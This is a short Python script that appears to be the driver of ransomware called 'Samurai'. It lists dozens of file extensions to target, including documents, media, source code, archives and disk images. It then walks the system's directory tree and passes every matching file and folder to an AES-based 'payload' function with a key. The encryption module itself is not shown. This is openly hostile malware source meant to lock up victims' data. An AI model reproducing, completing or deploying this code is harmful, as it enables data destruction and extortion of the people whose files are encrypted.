#!/usr/bin/python

import os, random, struct, hashlib
import SamuraiModule as Samurai
from Crypto.Cipher import AES

exe = ['exe', 'png', 'mp3', 'mp4', 'jpg', 'jpeg', 'xls', '3ds', '3dm', 'cpp', 'txt', 'asm', 'cmd', 'bat', 'vbs', 'php', 'java', 'wav', 'wmv', 'mpg', 'mpeg', 'avi', 'mov', 'mkv', 'svg', 'psd', 'raw', 'gif', 'bmp', 'iso', 'zip', 'rar', 'tgz', 'tar', 'vdi', 'pdf', 'csv', 'msg', 'ppt', 'pptx', 'html', 'pptm', 'xlc', 'xlm', 'xlt', 'xltm', 'dot', 'docm', 'docx', 'doc', 'dat', 'md', 'list', 'js', 'json', 'git', 'conf', 'rb']

def main(path):
	os.chdir(str(path))
	for root, dirs, files in os.walk('.', topdown = False):
		for name in files:
			if len(name.split(".")) > 1:
				Samurai.payload(Samurai.KEY, os.path.join(root, name))
			else:
				pass
	  	for name in dirs:
			if len(name.split(".")) > 1:
				Samurai.payload(Samurai.KEY, os.path.join(root, name))
			else:
				pass

if __name__ == "__main__":
	Samurai.get_system()
	main(Samurai.SYS_INFO["PATH"])
